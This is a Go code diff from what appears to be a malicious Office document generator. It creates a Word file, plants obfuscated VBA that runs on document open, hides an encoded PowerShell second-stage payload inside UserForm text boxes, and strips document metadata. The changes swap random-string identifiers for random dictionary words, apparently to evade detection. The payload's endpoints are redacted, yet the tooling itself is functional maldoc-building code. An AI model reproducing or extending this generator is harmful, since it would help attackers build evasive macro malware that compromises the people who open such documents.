@@ -43,19 +43,19 @@ func addLabel(n int, name string, text string, newForm *gomacro.Form) int {
 func setupForm(strList map[string]map[int]string, nameMap map[string]string, newForm *gomacro.Form, code string) string {
 
 	for n, value := range strList["TextBox"] {
-		nameMap[fmt.Sprintf("TextBox%v", n)] = obf.RandStringBytes(12)
+		nameMap[fmt.Sprintf("TextBox%v", n)] = obf.RandWord()
 		fmt.Printf("TextBox%v text is %s\n", n, value)
 		n = addTextBox(n, nameMap[fmt.Sprintf("TextBox%v", n)], value, newForm)
 	}
 
 	for n, value := range strList["PSPayload"] {
-		nameMap["PSPayload"] = obf.RandStringBytes(12)
+		nameMap["PSPayload"] = obf.RandWord()
 		fmt.Printf("PSPayload text is %s\n", value)
 		n = addTextBox(n, nameMap["PSPayload"], value, newForm)
 	}
 
 	for n, value := range strList["Label"] {
-		nameMap[fmt.Sprintf("Label%v", n)] = obf.RandStringBytes(12)
+		nameMap[fmt.Sprintf("Label%v", n)] = obf.RandWord()
 		fmt.Printf("Label%v text is %s\n", n, value)
 		n = addLabel(n, nameMap[fmt.Sprintf("Label%v", n)], value, newForm)
 	}
@@ -107,9 +107,8 @@ func main() {
 	fmt.Printf("Word version is %s\n", documents.Application.Version)
 
 	document := documents.AddDocument()
-	document.SaveAs("C:\\Users\\test\\go\\src\\github.com\\oxis\\gomacro\\cmd\\main\\Test.doc")
 
-	document.VBProject.SetName(obf.RandStringBytes(12))
+	document.VBProject.SetName(obf.RandWord())
 
 	thisDoc, err := document.VBProject.VBComponents.GetVBComponent("ThisDocument")
 	if err != nil {
@@ -118,22 +117,24 @@ func main() {
 		documents.Close()
 	}
 
-	thisDoc.SetName(obf.RandStringBytes(12))
+	thisDoc.SetName(obf.RandWord())
 
-	// Merges EntryPoint with String decrypt routine
-	vbaModuleCode := fmt.Sprintf("%v\n%v", resources.EntryPointFunction, resources.StringDecryptFunction)
+	code, funcMap, paramMap, varMap, stringMap := obf.ObfuscateVBCode(resources.EntryPointFunction, true, true, true, true)
+	code2, funcMap2, paramMap2, varMap2, stringMap2 := obf.ObfuscateVBCode(resources.StringDecryptFunction, true, true, true, false)
 
-	code, funcMap, _, _, strList := obf.ObfuscateVBCode(vbaModuleCode, 12)
-	docOpen := fmt.Sprintf(resources.DocumentOpen, obf.RandStringBytes(12))
+	code = obf.ReplaceAllInCode(fmt.Sprintf("%v\n%v", code, code2), funcMap, paramMap, varMap, stringMap)
+	code = obf.ReplaceAllInCode(code, funcMap2, paramMap2, varMap2, stringMap2)
+
+	docOpen := fmt.Sprintf(resources.DocumentOpen, obf.RandWord())
 	docOpen = strings.ReplaceAll(docOpen, "EntryPoint", funcMap["EntryPoint"])
 
 	thisDoc.CodeModule.AddFromString(docOpen)
 
 	var nameMap map[string]string = make(map[string]string)
 
-	nameMap["UserForm1"] = obf.RandStringBytes(12)
+	nameMap["UserForm1"] = obf.RandWord()
 	newForm := document.VBProject.VBComponents.AddNewForm(nameMap["UserForm1"])
-	newForm.SetProperty("Caption", obf.RandStringBytes(12))
+	newForm.SetProperty("Caption", obf.RandWord())
 
 	// Setup second stage
 	resources.Payload = fmt.Sprintf(resources.Payload, "[REDACTED]", "[REDACTED]")
@@ -142,19 +143,14 @@ func main() {
 	finalPayload := fmt.Sprintf(resources.PSPayload, b64Payload)
 
 	strMap := map[string]map[int]string{
-		"TextBox":   {},
 		"PSPayload": {0: encode(finalPayload, resources.Offset, resources.Sep)},
 		"Label": {1: resources.Offset, // Label1 is Offset
 			2: resources.Sep}, // Label2 is Sep
 	}
 
-	for i, p := range strList {
-		strMap["TextBox"][i] = encode(p, resources.Offset, resources.Sep)
-	}
-
 	code = setupForm(strMap, nameMap, newForm, code)
 
-	newModule := document.VBProject.VBComponents.AddVBComponent(obf.RandStringBytes(12), gomacro.MODULE)
+	newModule := document.VBProject.VBComponents.AddVBComponent(obf.RandWord(), gomacro.MODULE)
 	newModule.CodeModule.AddFromString(code)
 
 	document.Application.Options.SetOption("Pagination", false)
@@ -164,5 +160,6 @@ func main() {
 
 	document.RemoveDocumentInformation(99)
 	document.UndoClear()
+	document.SaveAs("C:\\Users\\test\\go\\src\\github.com\\oxis\\gomacro\\cmd\\main\\Test.doc")
 	documents.Save()
 }
